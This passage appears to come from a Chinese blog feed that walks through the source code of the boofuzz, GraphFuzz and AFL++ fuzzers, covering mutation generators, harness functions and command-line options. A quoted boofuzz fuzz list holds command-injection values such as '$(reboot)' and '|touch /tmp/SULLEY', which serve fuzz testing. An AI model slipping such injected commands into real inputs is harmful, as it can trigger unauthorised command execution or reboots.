href="#logger_close">此处</a>执行）</p></li><li><p><code>self._open_connection_keep_trying()</code>尝试与服务器进行连接（建立<strong>套接字</strong>并<strong>连接</strong>），如果是因为可用套接字数不够导致的错误，那就再进行50轮*5s的判断【如果在这段时间内有可以创建套接字，则继续进行，否则将报错】。</p></li><li><p><code>self._pre_send(target)</code>：不知道干啥的</p></li><li><p><code>self.transmit_fuzz()</code>：</p><ul><li><code>self.fuzz_node.render()</code>：渲染模糊测试节点数据</li><li>渲染完成后，由self.targets[0]来<strong>发送</strong>该数据</li><li>如果<code>self._receive_data_after_fuzz</code>为<code>True</code>，则将返回的信息保存到received变量中</li></ul></li><li><p><code>self._check_for_passively_detected_failures()</code>：被动检查错误。首先，需要遍历<code>target.monitors</code>该数组两遍，第一遍检查所有的monitor，判断其是否报告一个错误，如果报告了错误，那么需要收集一个崩溃信息【不确定是否monitor一定会提供一个崩溃信息，但以防万一还是要检查一下】；在第二遍，我们尝试从未检测到崩溃的监视器中获取崩溃概要作为补充信息。如果未检测到错误，则输出”No crash detected.”，并返回是否崩溃的标志</p></li><li><p>如果<code>self._reuse_target_connection</code>（重用目标连接）为假，那么直接关闭连接</p></li><li><p>最后进行三个操作：<code>self._process_failures()</code>【处理错误】、<span id="logger_close"><code>self._fuzz_data_logger.close_test_case()</code></span>【将日志写到数据库中】和<code>self.export_file()</code>【将对象值导出到本地磁盘/需要设置<code>self.session_filename</code>】</p></li></ul></li></ul><hr><p>详解<code>fuzz_case_iterator</code>：</p><ul><li>最先传入的是<code>self._generate_mutations_indefinitely(max_depth=max_depth)</code> 【默认 max_depth 为 <strong>None</strong> 】</li></ul><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_generate_mutations_indefinitely</span>(<span class="hljs-params">self, max_depth=<span class="hljs-literal">None</span>, path=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">"""Yield MutationContext with n mutations per message over all messages, with n increasing indefinitely."""</span><br>    depth = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> max_depth <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> depth &lt;= max_depth:  <span class="hljs-comment"># 当max_depth为None时，这里是一个无限循环</span><br>        valid_case_found_at_this_depth = <span class="hljs-literal">False</span>  <span class="hljs-comment"># 一个标志位，表示是否在该深度找到合法的测试用例</span><br>        <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> self._generate_n_mutations(depth=depth, path=path): <span class="hljs-comment"># 调用_generate_n_mutations()生成可迭代数据</span><br>            valid_case_found_at_this_depth = <span class="hljs-literal">True</span> <span class="hljs-comment"># 将是否在该深度找到合法的测试用例的标志位设置为1</span><br>            <span class="hljs-keyword">yield</span> m  <span class="hljs-comment"># 生成器返回m</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> valid_case_found_at_this_depth: <span class="hljs-comment"># 表示该层没有生成任何有效数据，则退出循环</span><br>            <span class="hljs-keyword">break</span><br>        depth += <span class="hljs-number">1</span> <span class="hljs-comment"># 深度++</span><br></code></pre></td></tr></tbody></table></figure><ul><li>接着就是分析内层生成器，i.e. <code>self._generate_n_mutations(depth=depth, path=path)</code>：</li></ul><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_generate_n_mutations</span>(<span class="hljs-params">self, depth, path</span>):<br>    <span class="hljs-string">"""Yield MutationContext with n mutations per message over all messages."""</span><br>    <span class="hljs-keyword">for</span> path <span class="hljs-keyword">in</span> self._iterate_protocol_message_paths(path=path):  <span class="hljs-comment"># 遍历path（消息）</span><br>        <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> self._generate_n_mutations_for_path(path, depth=depth): <span class="hljs-comment"># 为每一个消息进行n次变异</span><br>            <span class="hljs-keyword">yield</span> m<br></code></pre></td></tr></tbody></table></figure><p><span class="github-emoji"><span>1⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>self._iterate_protocol_message_paths(path=path)</code>：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_iterate_protocol_message_paths</span>(<span class="hljs-params">self, path=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">"""</span><br><span class="hljs-string">    Iterates over protocol and yields a path (list of Connection) leading to a given message).</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Args:</span><br><span class="hljs-string">        path (list of Connection): Provide a specific path to yield only that specific path.</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Yields:</span><br><span class="hljs-string">        list of Connection: List of edges along the path to the current one being fuzzed.</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Raises:</span><br><span class="hljs-string">        exception.SulleyRuntimeError: If no requests defined or no targets specified</span><br><span class="hljs-string">    """</span><br>    <span class="hljs-comment"># we can't fuzz if we don't have at least one target and one request.</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.targets:<br>        <span class="hljs-keyword">raise</span> exception.SullyRuntimeError(<span class="hljs-string">"No targets specified in session"</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.edges_from(self.root.<span class="hljs-built_in">id</span>):<br>        <span class="hljs-keyword">raise</span> exception.SullyRuntimeError(<span class="hljs-string">"No requests specified in session"</span>)<br><br>    <span class="hljs-keyword">if</span> path <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">yield</span> path<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> self._iterate_protocol_message_paths_recursive(this_node=self.root, path=[]):  <span class="hljs-comment"># 最关键的是该函数</span><br>            <span class="hljs-keyword">yield</span> x<br></code></pre></td></tr></tbody></table></figure><p>该函数<code>self._iterate_protocol_message_paths_recursive</code>的作用是返回一个以边构成的路径（请求序列）</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_iterate_protocol_message_paths_recursive</span>(<span class="hljs-params">self, this_node, path</span>):<br>    <span class="hljs-string">"""Recursive helper for _iterate_protocol.</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Args:</span><br><span class="hljs-string">        this_node (node.Node): Current node that is being fuzzed.</span><br><span class="hljs-string">        path (list of Connection): List of edges along the path to the current one being fuzzed.</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Yields:</span><br><span class="hljs-string">        list of Connection: List of edges along the path to the current one being fuzzed.</span><br><span class="hljs-string">    """</span><br>    <span class="hljs-comment"># step through every edge from the current node.</span><br>    <span class="hljs-keyword">for</span> edge <span class="hljs-keyword">in</span> self.edges_from(this_node.<span class="hljs-built_in">id</span>): <span class="hljs-comment"># 遍历请求依赖流图中以this_node.id起始的边（从root开始）</span><br>        <span class="hljs-comment"># keep track of the path as we fuzz through it, don't count the root node.</span><br>        <span class="hljs-comment"># we keep track of edges as opposed to nodes because if there is more then one path through a set of</span><br>        <span class="hljs-comment"># given nodes we don't want any ambiguity.</span><br>        path.append(edge)<br><br>        message_path = self._message_path_to_str(path)<br>        logging.debug(<span class="hljs-string">"fuzzing: {0}"</span>.<span class="hljs-built_in">format</span>(message_path))<br>        self.fuzz_node = self.nodes[path[-<span class="hljs-number">1</span>].dst] <span class="hljs-comment"># 与this_node连接的边的下一个节点（该节点为fuzz节点）</span><br><br>        <span class="hljs-keyword">yield</span> path<br><br>        <span class="hljs-comment"># recursively fuzz the remainder of the nodes in the session graph.</span><br>        <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> self._iterate_protocol_message_paths_recursive(self.fuzz_node, path):<br>            <span class="hljs-keyword">yield</span> x<br><br>    <span class="hljs-comment"># finished with the last node on the path, pop it off the path stack.</span><br>    <span class="hljs-keyword">if</span> path:<br>        path.pop()<br></code></pre></td></tr></tbody></table></figure><p>以boofuzz的提供的ftp脚本<code>ftp_simple.py</code>为例，其请求依赖流图如下所示：</p><pre><code class=" mermaid">graph TBa((root))--&gt;b((user))--&gt;c((pass))--&gt;d((stor))c--&gt;e((retr))</code></pre><p><code>_iterate_protocol_message_paths_recursive</code>生成器将会生成path有：<code>[user]</code>, <code>[user, pass]</code>, <code>[user, pass, stor]</code>, <code>[user, pass, retr]</code></p><p><span class="github-emoji"><span>2⃣</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>self._generate_n_mutations_for_path(path, depth=depth)</code>：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_generate_n_mutations_for_path</span>(<span class="hljs-params">self, path, depth</span>):<br>    <span class="hljs-string">"""Yield MutationContext with n mutations for a specific message.</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Args:</span><br><span class="hljs-string">        path (list of Connection): Nodes (Requests) along the path to the current one being fuzzed.</span><br><span class="hljs-string">        depth (int): Yield sets of depth mutations.</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Yields:</span><br><span class="hljs-string">        MutationContext: A MutationContext containing one mutation.</span><br><span class="hljs-string">    """</span><br>    <span class="hljs-keyword">for</span> mutations <span class="hljs-keyword">in</span> self._generate_n_mutations_for_path_recursive(path, depth=depth):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self._mutations_contain_duplicate(mutations):<br>            self.total_mutant_index += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">yield</span> MutationContext(message_path=path, mutations={n.qualified_name: n <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> mutations})<br></code></pre></td></tr></tbody></table></figure><p>该函数<code>self._generate_n_mutations_for_path_recursive</code>的作用是</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_generate_n_mutations_for_path_recursive</span>(<span class="hljs-params">self, path, depth, skip_elements=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">if</span> skip_elements <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        skip_elements = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">if</span> depth == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">yield</span> []<br>        <span class="hljs-keyword">return</span><br>    new_skip = skip_elements.copy()<br>    <span class="hljs-keyword">for</span> mutations <span class="hljs-keyword">in</span> self._generate_mutations_for_request(path=path, skip_elements=skip_elements):<br>        new_skip.update(m.qualified_name <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> mutations)<br>        <span class="hljs-keyword">for</span> ms <span class="hljs-keyword">in</span> self._generate_n_mutations_for_path_recursive(path, depth=depth - <span class="hljs-number">1</span>, skip_elements=new_skip):<br>            <span class="hljs-keyword">yield</span> mutations + ms<br></code></pre></td></tr></tbody></table></figure><p><code>self._generate_mutations_for_request</code> –&gt; <code>self.fuzz_node.get_mutations</code> –&gt; <code>self.mutations</code> –&gt; <code>item.get_mutations()</code>–&gt;<code>mutations() [in string.py]</code>，</p><p>这里需要注意的是，<code>boofuzz/primitives/string.py</code>中定义了一些字典值，存放在变量<code>self._fuzz_library</code>中</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># store fuzz_library as a class variable to avoid copying the ~70MB structure across each instantiated primitive.</span><br>    <span class="hljs-comment"># Has to be sorted to avoid duplicates</span><br>    _fuzz_library = [<br>        <span class="hljs-string">"!@#$%%^#$%#$@#$%$$@#$%^^**(()"</span>,<br>        <span class="hljs-string">""</span>,  <span class="hljs-comment"># strings ripped from spike (and some others I added)</span><br>        <span class="hljs-string">"$(reboot)"</span>,<br>        <span class="hljs-string">"$;reboot"</span>,<br>        ...<br>        <span class="hljs-string">"|touch /tmp/SULLEY"</span>,  <span class="hljs-comment"># command injection.</span><br>        <span class="hljs-string">"||reboot;"</span>,<br>        <span class="hljs-string">"||reboot|"</span>,<br>    ]<br></code></pre></td></tr></tbody></table></figure><p>该调用链每次会构造一个变异类，然后在<code>_main_fuzz_loop</code>模糊测试大循环中使用：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_main_fuzz_loop</span>(<span class="hljs-params">self, fuzz_case_iterator</span>):<br>...<br>            <span class="hljs-keyword">for</span> mutation_context <span class="hljs-keyword">in</span> fuzz_case_iterator:  <span class="hljs-comment"># fuzz_case_iterator --&gt; 变异产生迭代器</span><br>            ...<br></code></pre></td></tr></tbody></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>简单来说，boofuzz总体流程是：1. <strong>遍历请求序列流图（树）并构造序列</strong>；2. <strong>产生变异数据</strong>；3. <strong>发送到目标服务器</strong></p><p>boofuzz整体框架如下图所示：</p><p><img src="/2022/09/27/Boofuzz%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/1.png"></p>]]></content>
    
    
    
    <tags>
      
      <tag>模糊测试</tag>
      
      <tag>协议fuzz</tag>
      
      <tag>工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GraphFuzz源码解析</title>
    <link href="/2022/07/25/GraphFuzz%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/"/>
    <url>/2022/07/25/GraphFuzz%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="GraphFuzz源码解析"><a href="#GraphFuzz源码解析" class="headerlink" title="GraphFuzz源码解析"></a>GraphFuzz源码解析</h1><ul><li>核心代码位于<code>core</code>目录下<ul><li><code>graph.hpp</code>为图结构体头文件，主要包含一个结构体<code>NodeLink</code>和一个类<code>TGraph</code></li><li><code>schema.hpp</code>声明了一个类<code>Schema</code>，同时包含<code>ScopeDef</code>、<code>Signature</code>，<code>hash</code>，<code>ScopeTree</code>和<code>TypeTree</code>这五个结构体</li><li><code>harness.cpp</code>为生成的<code>harness</code>文件，该文件调用<code>libfuzzer</code>的接口来实现相关功能</li></ul></li></ul><h2 id="harness-cpp"><a href="#harness-cpp" class="headerlink" title="harness.cpp"></a>harness.cpp</h2><ul><li><p><code>LLVMFuzzerInitialize()</code>：</p><p>该函数为<code>libfuzzer</code>提供的接口，用于进行模糊测试前的初始化操作：</p><ul><li>for循环体内对命令行参数进行解析：</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; *argc; ++i) {<br>    <span class="hljs-comment">// do something to parse cmd line</span><br>}<br></code></pre></td></tr></tbody></table></figure><p>共有14个命令行选项：</p><table><thead><tr><th>支持的命令行选项</th><th>描述</th></tr></thead><tbody><tr><td>–graphfuzz_debug</td><td>是否启用debug</td></tr><tr><td>–graphfuzz_skip_validation</td><td>是否跳过有效性验证</td></tr><tr><td>–graphfuzz_prune_cache</td><td>是否精简缓存</td></tr><tr><td>–graphfuzz_enable_soft_execution</td><td>是否启用软执行（有点类似于forkserver）</td></tr><tr><td>–graphfuzz_ignore_invalid</td><td>是否忽略无效的模式（默认false）</td></tr><tr><td>–graphfuzz_trace_mutations</td><td>是否跟踪变异，如果启用，则会保存相关日志</td></tr><tr><td>–graphfuzz_catch=</td><td>捕获那些异常信号，值为若干个信号编号，用逗号隔开</td></tr><tr><td>–graphfuzz_scope_max_depth=</td><td>设置最大scope_max_depth，默认值为10</td></tr><tr><td>–graphfuzz_context_mutation_prob=</td><td>对上下文变量进行变异的概率，默认为0.95</td></tr><tr><td>–graphfuzz_max_nodes=</td><td>每个图最大节点数，默认为200</td></tr><tr><td>–graphfuzz_schema=</td><td>模式文件重命名，默认为”schema.json”</td></tr><tr><td>–graphfuzz_mutate_one</td><td>–graphfuzz_mutate_one &lt;seed&gt; &lt;input&gt; &lt;output&gt;<br>在初始化阶段对种子进行一次变异</td></tr><tr><td>–graphfuzz_init_corpus</td><td>–graphfuzz_init_corpus &lt;corpus&gt;<br>初始化种子</td></tr></tbody></table><ul><li><p><code>Schema::FromFile()</code>从<code>schema.json</code>中读取模式文件并保存到<code>Schema *global_schema</code>变量中</p></li><li><p>调用<code>Schema::Validate()</code>函数来验证<code>schema</code>是否有效，主要检查每个类是否包含构造或析构函数</p></li><li><p><code>register_signals()</code>：注册信号，主要为 <code>graphfuzz_catch</code> 变量指定的需要捕获的信号添加句柄函数<code>sig_handler</code>，该函数使用<code>siglongjmp()</code>函数让程序<strong>跳转到先前配置的跳转点</strong></p></li><li><p>对种子/语料库进行变异或初始化操作（二选一）</p></li><li><p><code>global_init(orig_argc, orig_argv)</code>执行<code>fuzz_exec.cpp</code>定义的相关方法，用于对参数进行初始化操作，默认情况下为空</p></li></ul></li></ul><hr><ul><li><code>MutateOne()</code>：<ul><li>调用<code>LLVMFuzzerCustomMutator()</code>对种子进行变异，然后将变异后的信息保存到<code>--graphfuzz_mutate_one</code>指定的output中</li></ul></li></ul><hr><ul><li><p><code>LLVMFuzzerCustomMutator()</code>：</p><p>该函数为<code>libfuzzer</code>提供的接口，用于进行自定义的变异：</p><ul><li><p>首先根据模式构建<code>TGraph</code>变量g，然后g读入种子数据并验证其有效性</p><ul><li>如果读入失败或无法通过有效性验证，则根据种子重新创建一个新的图</li><li>否则，则调用<code>TGraph::Mutate</code>方法进行图变异（十选一）</li></ul></li><li><p>将生成的图序列化为字符串，并将变异后的数据更新回缓冲区</p></li></ul></li></ul><hr><ul><li><p><code>LLVMFuzzerCustomCrossOver()</code>：</p><p>该函数为<code>libfuzzer</code>提供的接口，用于两个种子之间自定义交叉变异</p></li></ul><hr><ul><li><p><span class="github-emoji"><span>⭐</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>LLVMFuzzerTestOneInput()</code>：</p><p>该函数为<code>libfuzzer</code>提供的接口，为<code>libfuzzer</code>主模糊测试模块，用于将生成的数据投喂给目标</p><ul><li><p><code>sigsetjmp()</code>函数在<code>LLVMFuzzerTestOneInput()</code>起始处设置跳转点</p></li><li><p>调用<code>shim_init()</code>函数，确保已经获得覆盖信息</p></li><li><p>构建一个<code>TGraph</code>（模板图）的变量g，然后读入生成的数据（是否成功读入），并检验其合法性（是否有构造和析构）</p></li><li><p>调用<code>TGraph</code>类的<code>GetOrderedNodes()</code>方法得到layer递增的节点序列，然后遍历每一个节点：</p><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">void</span> *ref[nodes.<span class="hljs-built_in">size</span>()][MAX_CONN]; <span class="hljs-comment">// 生成一个二维指针数组</span><br></code></pre></td></tr></tbody></table></figure><ul><li>首先载入输入，具体来说：</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">void</span> *in_ref[n.<span class="hljs-built_in">in_ref_size</span>()];<br><span class="hljs-comment">// ...</span><br>in_ref[i] = ref[n.<span class="hljs-built_in">index</span>()][i]; <span class="hljs-comment">// 将指针值赋值给in_ref[i]，显然默认为0</span><br></code></pre></td></tr></tbody></table></figure><ul><li>然后调用函数端点，</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-built_in">void</span> (*func)(<span class="hljs-type">void</span> **, <span class="hljs-type">void</span> **, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *) = FUZZER_SHIMS[n.<span class="hljs-built_in">type</span>()];<br><span class="hljs-built_in">func</span>(in_ref, out_ref, context); <span class="hljs-comment">// 将in_ref, out_ref和context投喂给端点</span><br></code></pre></td></tr></tbody></table></figure><ul><li>最后，将输出拷贝到结果中（注：结果在函数端点调用时已经写到out_ref中），</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n.<span class="hljs-built_in">out_ref_size</span>(); ++i) {<br>    NodeRef r = n.<span class="hljs-built_in">out_ref</span>(i);<br>    ref[r.<span class="hljs-built_in">node_idx</span>()][r.<span class="hljs-built_in">conn_idx</span>()] = out_ref[i]; <span class="hljs-comment">// 如果当前输出作为下一个连接节点的输入，那么更新ref数组</span><br>    <span class="hljs-keyword">if</span> (graphfuzz_debug) {<br>        cout &lt;&lt; <span class="hljs-string">"Got output: "</span> &lt;&lt; i &lt;&lt; <span class="hljs-string">" :: "</span> &lt;&lt; out_ref[i] &lt;&lt; endl;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p><img src="/2022/07/25/GraphFuzz%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/o5.png"></p></li><li><p>调用<code>shim_finalize()</code></p></li></ul></li></ul><hr><ul><li><code>graphfuzz_try()</code>：<ul><li>用于实现软执行，在主模糊测试流程中未使用</li></ul></li></ul><h2 id="graph-hpp"><a href="#graph-hpp" class="headerlink" title="graph.hpp"></a>graph.hpp</h2><ul><li>该头文件定义了一些图相关的结构体和方法，其中最重要的是<code>Mutate()</code>方法</li></ul><hr><ul><li><p><code>Mutate()</code>：</p><p>调用链<span class="github-emoji"><span>🔗</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f517.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> – <strong>harness.cpp</strong>：<code>MutateOne()</code> $\rightarrow$ <code>LLVMFuzzerCustomMutator()</code> $\rightarrow$ <code>TGraph::Mutate()</code></p><p>分为两类变异：</p><ul><li>上下文变异<code>MutateContext()</code>【概率：默认为0.95】</li><li>基于图变异（九选一）【具体详见论文】：</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">switch</span> (mut_choice) {<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>: <span class="hljs-built_in">MutateCrosslink</span>(); <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>: <span class="hljs-built_in">MutateTruncateDestructor</span>(); <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>: <span class="hljs-built_in">MutateTruncateConstructor</span>(); <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>: <span class="hljs-built_in">MutateLayerIndex</span>(); <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>: <span class="hljs-built_in">MutateSwapEquivalent</span>(); <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>: <span class="hljs-built_in">MutateExtendDestructor</span>(); <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>: <span class="hljs-built_in">MutateExtendConstructor</span>(); <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>: <span class="hljs-built_in">MutateSpliceIn</span>(); <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>: <span class="hljs-built_in">MutateSpliceOut</span>(); <span class="hljs-keyword">break</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><p><span class="github-emoji"><span>🤔</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f914.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> 存在问题：变异方法调度仅使用概率，可能存在某种harness序列上下文过度变异【同时可能会导致图变异饿死】或者上下文变异不足【导致bug遗漏，可能会在后面图变异生成相同的变异模式（或类似的变异模式？）】</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>模糊测试</tag>
      
      <tag>工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>AFL++源码浅析</title>
    <link href="/2022/07/06/AFLplusplus%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90/"/>
    <url>/2022/07/06/AFLplusplus%E6%BA%90%E7%A0%81%E6%B5%85%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="AFL-源码解析"><a href="#AFL-源码解析" class="headerlink" title="AFL++源码解析"></a>AFL++源码解析</h1><h2 id="afl-fuzz-c"><a href="#afl-fuzz-c" class="headerlink" title="afl-fuzz.c"></a>afl-fuzz.c</h2><h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a><strong>main函数</strong></h3><ul><li><code>rand_set_seed()</code>设置四个种子：afl-&gt;init_seed, afl-&gt;rand_seed[0-2]</li><li>while循环对选项进行判断，支持的选项有：<code>"+Ab:B:c:CdDe:E:hi:I:f:F:g:G:l:L:m:M:nNOo:p:RQs:S:t:T:UV:WXx:YZ"</code>：</li></ul><table><thead><tr><th>选项</th><th>描述</th></tr></thead><tbody><tr><td><code>-i dir</code></td><td>测试用例输入目录</td></tr><tr><td><code>-o dir</code></td><td>模糊测试发现的输出目录</td></tr><tr><td><code>-p schedule</code></td><td>能量调度计算一个种子表现分数：fast（默认），explore，exploit，seek，rare，mmopt，coe，lin，quad</td></tr><tr><td><code>-f file</code></td><td>目标程序读入数据的位置（默认：stdin 或 @@）</td></tr><tr><td><code>-t msec</code></td><td>每轮的超时时间（默认 1000 ms），添加’+’来自动计算超时时间</td></tr><tr><td><code>-m megs</code></td><td>子进程内存限制（0 MB，0=无限制 [默认]）</td></tr><tr><td><code>-A</code></td><td>使用仅二进制插桩（ARM CoreSight mode）</td></tr><tr><td><code>-O</code></td><td>使用仅二进制插桩（FRIDA mode）</td></tr><tr><td><code>-Q</code></td><td>使用仅二进制插桩（QEMU mode）</td></tr><tr><td><code>-U</code></td><td>使用基于unicorn的插桩（Unicorn mode）</td></tr><tr><td><code>-W</code></td><td>使用基于qemu的Wine插桩（Wine mode）</td></tr><tr><td><code>-X</code></td><td>使用VM模糊测试（NYX mode - standalone 